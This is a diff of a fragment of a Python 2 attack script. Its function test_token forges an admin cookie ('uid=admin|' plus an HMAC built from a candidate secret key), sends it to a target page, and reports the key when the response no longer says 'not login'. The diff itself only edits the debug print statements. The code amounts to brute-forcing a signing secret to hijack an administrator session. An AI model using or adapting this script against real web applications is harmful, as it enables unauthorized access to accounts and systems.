@@ -41,13 +41,13 @@ def test_token(s,screat,phpsessionid):
 
     s.headers['cookie']=""
     s.headers['Cookie']="uid=admin%7c"+hash_hmac(screat)+"; "+phpsessionid
-    print s.headers['Cookie']
+    
 
     res=s.get(test_cookie)
     if res.content.find("not login")<0:
         print "key",screat
-        print "cookies",requests.utils.dict_from_cookiejar(s.cookies)
-        print "content",res.content
+        print "cookies",s.headers['Cookie']
+        
         return True
     else:
         print "key:",screat,"failed!"
